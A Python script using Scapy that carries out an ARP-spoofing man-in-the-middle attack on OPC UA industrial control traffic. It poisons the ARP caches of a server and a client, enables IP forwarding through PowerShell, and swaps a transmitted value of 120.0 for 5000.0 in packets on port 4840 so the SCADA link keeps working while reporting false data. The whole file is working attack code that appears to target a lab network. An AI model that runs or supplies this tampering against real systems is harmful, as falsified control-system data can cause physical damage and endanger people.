from scapy.all import *
import time
import struct
import subprocess
import signal

INTERFACE = 20  
SERVER_IP = "10.204.157.171" # <--- Replace with the real Server IPv4
TARGET_IP = "10.204.157.245" # <--- This is YOUR IP (the Flask Client)

OLD_VAL = 120.0
NEW_VAL = 5000.0

keep_running = True

def signal_handler(sig, frame):
    global keep_running
    print("\n[!] Shutdown signal received...")
    keep_running = False

def get_mac(ip):
    """Fetch MAC address for ARP spoofing."""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                 iface=INTERFACE, timeout=2, verbose=False)
    for _, rcv in ans:
        return rcv.src
    return None

def spoof_arp(target_ip, host_ip):
    """Poison ARP cache."""
    target_mac = get_mac(target_ip)
    if not target_mac: return
    # op=2 is a reply. We tell target that host is at OUR MAC.
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    send(packet, iface=INTERFACE, verbose=False)

def manipulate_opcua(pkt):
    """Intercept and modify packets in transit."""
    if pkt.haslayer(TCP) and pkt[IP].src == SERVER_IP and pkt[TCP].sport == 4840:
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load
            # OPC UA floats are 8-byte Little-Endian doubles
            old_hex = struct.pack('<d', OLD_VAL)
            new_hex = struct.pack('<d', NEW_VAL)
            
            if old_hex in payload:
                print(f"[!] INTERCEPTED: Changing {OLD_VAL} to {NEW_VAL} on the wire!")
                modified_payload = payload.replace(old_hex, new_hex)
                
                # Rebuild TCP packet with new payload
                new_pkt = (IP(src=pkt[IP].src, dst=pkt[IP].dst) /
                           TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, 
                               seq=pkt[TCP].seq, ack=pkt[TCP].ack, flags=pkt[TCP].flags) /
                           modified_payload)
                
                # Force recalculation of headers
                del new_pkt[IP].len
                del new_pkt[IP].chksum
                del new_pkt[TCP].chksum
                send(new_pkt, iface=INTERFACE, verbose=False)
                return 

    # Forward other traffic so we don't break the SCADA link
    if pkt.haslayer(IP) and pkt[IP].dst != get_if_addr(INTERFACE):
        send(pkt, iface=INTERFACE, verbose=False)

signal.signal(signal.SIGINT, signal_handler)

def main():
    show_interfaces()
    print(f"[*] Starting Data Manipulation on: {INTERFACE}")
    
    # Enable Windows IP Forwarding via PowerShell
    print("[*] Enabling IP Forwarding...")
    subprocess.run(["powershell", "Set-NetIPInterface -Forwarding Enabled"], shell=True)

    try:
        print("[*] Poisoning ARP... Press Ctrl+C to stop.")
        while True:
            # Tell Client we are Server
            spoof_arp(TARGET_IP, SERVER_IP)
            # Tell Server we are Client
            spoof_arp(SERVER_IP, TARGET_IP)
            
            # Intercept 5 packets at a time
            sniff(iface=INTERFACE, prn=manipulate_opcua, filter="tcp port 4840", count=5, timeout=1, store=0, stop_filter=lambda x: not keep_running)
            
            if not keep_running:
                break
    except KeyboardInterrupt:
        print("\n[*] Restoring and disabling forwarding...")
        subprocess.run(["powershell", "Set-NetIPInterface -Forwarding Disabled"], shell=True)

if __name__ == "__main__":
    main()